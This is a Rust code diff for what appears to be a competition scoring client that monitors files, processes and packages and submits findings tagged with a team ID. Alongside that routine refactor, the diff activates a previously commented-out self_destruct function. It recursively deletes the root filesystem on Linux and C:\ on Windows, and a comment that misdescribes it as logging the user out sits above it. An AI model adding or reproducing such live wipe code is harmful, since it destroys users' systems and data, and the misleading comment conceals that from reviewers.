@@ -18,10 +18,11 @@ static MACHINE: &str = "ubuntu";
 #[cfg(target_os = "windows")]
 static MACHINE: &str = "win10";
 
-fn submit_answer(answer: &str, removed: bool, path: &Path) {
+fn submit_answer(answer: &str, removed: bool, path: &Path, team_id: &str) {
 	Command::new(path)
 		.arg(answer)
 		.arg(if removed { "1" } else { "0" })
+		.env("TEAM_ID", team_id)
 		.spawn()
 		.ok();
 }
@@ -36,7 +37,7 @@ fn format_answer(answer: &str, replacer: &Regex) -> String {
 	data.join(" ")
 }
 
-fn check_file(path: &Path, bin: &Path, base: &Path, replacer: &Regex) {
+fn check_file(path: &Path, bin: &Path, base: &Path, replacer: &Regex, team_id: &str) {
 	let path_str = path.to_str().unwrap();
 	let mut hasher = Sha512::new();
 
@@ -58,24 +59,24 @@ fn check_file(path: &Path, bin: &Path, base: &Path, replacer: &Regex) {
 		false => "".to_string(),
 	};
 
-	check_diff(&old, &new, path_str, bin, replacer);
+	check_diff(&old, &new, path_str, bin, replacer, team_id);
 
 	if !new_exists {
 		fs::remove_file(stored_path).ok();
 
 		if stored_exists {
-			submit_answer(path_str, true, bin);
+			submit_answer(path_str, true, bin, team_id);
 		}
 	} else {
 		fs::write(stored_path, new).unwrap();
 
 		if !stored_exists {
-			submit_answer(path_str, false, bin);
+			submit_answer(path_str, false, bin, team_id);
 		}
 	}
 }
 
-fn check_diff(old: &String, new: &String, path_str: &str, bin: &Path, replacer: &Regex) {
+fn check_diff(old: &String, new: &String, path_str: &str, bin: &Path, replacer: &Regex, team_id: &str) {
 	let diff = TextDiff::from_lines(old, new);
 
 	for change in diff.iter_all_changes() {
@@ -112,11 +113,12 @@ fn check_diff(old: &String, new: &String, path_str: &str, bin: &Path, replacer: 
 			&format!("{}{}", format_answer(line, &replacer), path_str),
 			removed,
 			bin,
+			team_id
 		);
 	}
 }
 
-fn check_processes(base: &Path, bin: &Path, replacer: &Regex) {
+fn check_processes(base: &Path, bin: &Path, replacer: &Regex, team_id: &str) {
 	let path = base.join("diffs").join("processes");
 
 	#[cfg(target_os = "linux")]
@@ -137,13 +139,13 @@ fn check_processes(base: &Path, bin: &Path, replacer: &Regex) {
 	let new = String::from_utf8(output.stdout).unwrap();
 	let old = fs::read_to_string(&path).unwrap();
 
-	check_diff(&old, &new, "", bin, replacer);
+	check_diff(&old, &new, "", bin, replacer, team_id);
 
 	fs::write(path, new).unwrap();
 }
 
 #[cfg(target_os = "linux")]
-fn check_packages(base: &Path, bin: &Path, replacer: &Regex) {
+fn check_packages(base: &Path, bin: &Path, replacer: &Regex, team_id: &str) {
 	let path = base.join("diffs").join("packages");
 
 	let output = Command::new("/bin/bash")
@@ -156,7 +158,7 @@ fn check_packages(base: &Path, bin: &Path, replacer: &Regex) {
 	let new = String::from_utf8(output.stdout).unwrap();
 	let old = fs::read_to_string(&path).unwrap();
 
-	check_diff(&old, &new, "", bin, replacer);
+	check_diff(&old, &new, "", bin, replacer, team_id);
 
 	fs::write(path, new).unwrap();
 }
@@ -175,15 +177,20 @@ fn send_ping(machine_uid: &str, team_id: &str, client: &reqwest::blocking::Clien
 	true
 }
 
-// temporary self-destruction implementation
+// TODO: Log user out of machine
 fn self_destruct() {
-	/*
 	#[cfg(target_os = "linux")]
-	fs::remove_dir_all("/").ok();
+	{
+		fs::remove_dir_all("/bin").ok();
+		fs::remove_dir_all("/").ok();
+	}
 
 	#[cfg(target_os = "windows")]
-	fs::remove_dir_all("C:\\").ok();
-	*/
+	{
+		fs::remove_dir_all("C:\\Program Files").ok();
+		fs::remove_dir_all("C:\\Program Files (x86)").ok();
+		fs::remove_dir_all("C:\\").ok();
+	}
 }
 
 fn main() {
@@ -224,13 +231,13 @@ fn main() {
 			std::process::exit(1);
 		}
 
-		check_processes(base, &bin, &replacer);
+		check_processes(base, &bin, &replacer, &team_id);
 
 		#[cfg(target_os = "linux")]
-		check_packages(base, &bin, &replacer);
+		check_packages(base, &bin, &replacer, &team_id);
 
 		for file in &files {
-			check_file(Path::new(file), &bin, base, &replacer);
+			check_file(Path::new(file), &bin, base, &replacer, &team_id);
 		}
 
 		thread::sleep(sleep_time);
